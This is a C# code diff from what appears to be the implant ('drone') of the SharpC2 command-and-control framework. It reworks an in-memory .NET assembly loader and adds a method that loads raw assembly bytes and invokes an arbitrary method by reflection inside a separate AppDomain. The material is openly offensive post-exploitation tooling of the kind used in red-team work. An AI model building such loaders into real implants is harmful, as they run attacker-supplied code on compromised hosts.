@@ -1,19 +1,33 @@
 ﻿using System;
 using System.IO;
 using System.Text;
+
 using Reflect = System.Reflection;
 
 namespace Drone.SharpSploit.Execution
 {
     public static class Assembly
     {
-        public static string Execute(byte[] assemblyBytes, string[] args = null)
+        private static string AppDomainName => "SharpC2";
+        
+        public static string AssemblyExecute(byte[] assemblyBytes, string[] args = null)
         {
             args ??= new string[] { };
 
-            var domain = AppDomain.CreateDomain(Guid.NewGuid().ToShortGuid(), null, null, null, false);
+            var domain = AppDomain.CreateDomain(AppDomainName, null, null, null, false);
             var proxy = (ShadowRunnerProxy)domain.CreateInstanceAndUnwrap(typeof(ShadowRunnerProxy).Assembly.FullName, typeof(ShadowRunnerProxy).FullName);
-            var result = proxy.ExecuteAssembly(assemblyBytes, args);
+            var result = proxy.AssemblyExecute(assemblyBytes, args);
+            
+            AppDomain.Unload(domain);
+
+            return result;
+        }
+
+        public static string AssemblyReflect(byte[] assemblyBytes, string type, string method)
+        {
+            var domain = AppDomain.CreateDomain(AppDomainName, null, null, null, false);
+            var proxy = (ShadowRunnerProxy)domain.CreateInstanceAndUnwrap(typeof(ShadowRunnerProxy).Assembly.FullName, typeof(ShadowRunnerProxy).FullName);
+            var result = proxy.AssemblyReflect(assemblyBytes, type, method);
             
             AppDomain.Unload(domain);
 
@@ -23,7 +37,7 @@ namespace Drone.SharpSploit.Execution
 
     public class ShadowRunnerProxy : MarshalByRefObject
     {
-        public string ExecuteAssembly(byte[] bytes, string[] args)
+        public string AssemblyExecute(byte[] bytes, string[] args)
         {
             var asm = Reflect.Assembly.Load(bytes);
             
@@ -51,6 +65,12 @@ namespace Drone.SharpSploit.Execution
             ms.Dispose();
             
             return result;
+        }
+
+        public string AssemblyReflect(byte[] bytes, string type, string method)
+        {
+            var asm = Reflect.Assembly.Load(bytes);
+            return (string) asm.GetType(type)?.GetMethod(method)?.Invoke(null, new object[] { });
         }
     }
 }
